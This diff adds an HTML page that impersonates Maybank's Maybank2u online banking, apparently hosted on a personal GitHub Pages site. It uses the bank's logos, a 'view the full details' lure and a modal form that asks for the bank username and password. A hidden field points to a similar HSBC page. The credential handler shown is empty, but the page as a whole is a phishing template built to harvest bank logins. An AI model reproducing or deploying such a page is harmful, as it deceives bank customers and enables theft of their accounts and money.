@@ -1,0 +1,60 @@
+<!DOCTYPE html><html><head>
+    <base href="https://skipo2010.github.io/maybank-details.github.io/"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <link href="style.css" rel="stylesheet"/>
+    <link href="maybank favi.png" rel="icon" type="x-icon"/>
+    <title>Maybank2u | Maybank Malaysia</title>
+</head>
+<body>
+<div class="centered-container">
+    <h2> </h2>
+    <img alt="maybank" src="maybanklogo.png" style="width:60%;"/>
+    <h2>Click Here to view the full details</h2>
+    <button onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;block&#39;" style="width:auto;">Here</button>
+</div>
+
+<div class="modal" id="id01">
+    <form action="" class="modal-content animate" method="post" onsubmit="return validateForm()">
+        <input type="hidden" value="https://skipo2010.github.io/hsbc-details.github.io/"/>
+        <div class="imgcontainer">
+            <span class="close" onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;none&#39;" title="Close Modal">×</span>
+            <img alt="Avatar" class="avatar" src="Logo-Maybank.jpg"/>
+        </div>
+
+        <div class="container">
+            <label for="uname"><b>Enter your Username <span style="color:red;">*</span></b></label>
+            <input id="username" name="username" placeholder="Enter Username" required="" type="text"/>
+            <label for="psw"><b>Enter Your Password <span style="color:red;">*</span></b></label>
+            <input id="password" name="password" placeholder="Enter Password" required="" type="password"/>
+            <button class="register-button" type="submit">Register</button>
+            <label>
+                <input checked="checked" type="checkbox"/> Remember me
+            </label>
+        </div>
+
+        <div class="container" style="background-color:#f1f1f1">
+            <button class="cancelbtn" onclick="document.getElementById(&#39;id01&#39;).style.display=&#39;none&#39;" type="button">Cancel</button>
+            <span class="psw">Forgot <a href="#">password?</a></span>
+        </div>
+    </form>
+</div>
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        modal.style.display = "none";
+    }
+}
+
+function validateForm() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+}
+</script>
+
+
+
+</body></html>
